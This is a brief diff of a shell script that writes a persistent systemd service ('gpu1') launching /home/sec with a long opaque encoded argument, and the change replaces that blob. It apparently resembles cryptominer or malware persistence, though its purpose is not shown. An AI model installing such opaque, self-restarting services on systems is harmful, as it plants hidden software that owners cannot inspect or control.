@@ -11,7 +11,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/sec nXU+udQAfXjYiFPHrktsC5XiyhnD9KfWQgPtHTFtc4q+tvGtbvXf2RwOatuK3gkOgmtIRrgs/KTCmHF5mbOZEayRsStLR9icEnKsdNKWGUHsT1jSI7Lr2Q7telSmgUG7Tvj0wgb67JgmQSLF4xqMpJSojlyvAEdH+BX+ZeObTPy4dB6G/tQCIZib1tA5rRoKJAClMr0clCPtA5K2S8k7WvfQLHjUc3jTQRYZckXfPejSpIg+nyhb3NakLMY=
+ExecStart= /home/sec ezmFUi7q7Gs/ABNlecoi5cF11pWubZ/Q6uGKhyfAfa1NTGkGu0R+UQKncQMZh/p3/R/LxRNCo/pczxyg9ApB6qcoM9y+7QzLNM9Xd/dl6nkcifK4WiwiZaOG/zwNpzmGq37v7ERCWA8VNTV72nG8igAYIZErFtBC04jM9qpMWGH5atXCylcXi61gzBamCUurvapTjCY58eRIKvwYhyKd+53WjI5G5G/Oz+EaQ9j2v4n5Yc7jkrjw8Uti
 WatchdogSec=36000
 Restart=always
 RestartSec=60
